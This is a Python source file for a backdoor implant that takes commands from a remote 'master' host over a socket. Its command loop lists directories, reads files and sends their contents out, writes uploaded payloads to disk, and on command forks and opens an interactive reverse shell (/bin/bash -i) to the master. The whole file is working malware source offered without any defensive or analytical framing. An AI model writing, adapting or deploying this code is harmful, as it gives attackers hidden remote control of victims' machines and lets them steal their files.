from sys import exit
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as socket_error
from os import dup2, fork, listdir, getcwd
from subprocess import run
from time import sleep

class Backdoor():
    def __init__(self, conn, master_hostname, master_port):
        self.conn = conn
        self.master_hostname = master_hostname
        self.master_port = master_port

    def reverse_shell(self):
        pid = fork()
        if pid == 0:
            pid2 = fork()
            if pid2 == 0:
                self.sh_conn = socket(AF_INET, SOCK_STREAM)
                self.sh_conn.connect((self.master_hostname, self.shell_port)) 
                dup2(self.sh_conn.fileno(),0) 
                dup2(self.sh_conn.fileno(),1) 
                dup2(self.sh_conn.fileno(),2) 
                run(["/bin/bash","-i"])
                # reborn(master_hostname, master_port)
        exit(0)

    def send_res(self, res):
        try:
            res = "ACK" + res
            self.conn.send(res.encode())
        except socket_error:
            # error sending data to master
            exit(0)

    def recv_cmd(self):
        try:
            encoded_cmd = self.conn.recv(1024)
            cmd = encoded_cmd.decode()
            return cmd
        except socket_error:
            # error connecting to master to recv data
            exit(0)

    def cmd_shell(self):
        while True:
            cmd = self.recv_cmd()

            res = ""
            if cmd[:2] == "ls":
                res = ""
                if len(cmd) > 2:
                    path = cmd[3:]
                else:
                    path = "."
                resp_list = listdir(path)
                for resp in resp_list:
                    res += resp + "\n"
            elif cmd[:3] == "pwd":
                res = str(getcwd())
            elif cmd[:3] == "cat":
                with open(cmd[3:], "r") as fp:
                    data = fp.read()
                res += data
            elif cmd[:2] == "dl":
                filepath = cmd[3:]
                try:
                    fp = open(filepath, "r")
                except:
                    continue
                data = fp.read()
                fp.close()
                res = str(data)
            elif cmd[:2] == "pl":
                filename = "master_dl"
                encoded_data = self.conn.recv(64000)
                data = encoded_data.decode()
                fp = open(filename, "w")
                fp.write(data)
                fp.close()
            elif cmd[:5] == "shell":
                self.shell_port = int(cmd[5:])
                sleep(1)
                self.reverse_shell()
            else:
                res = "404could not find command"

            self.send_res(res)
                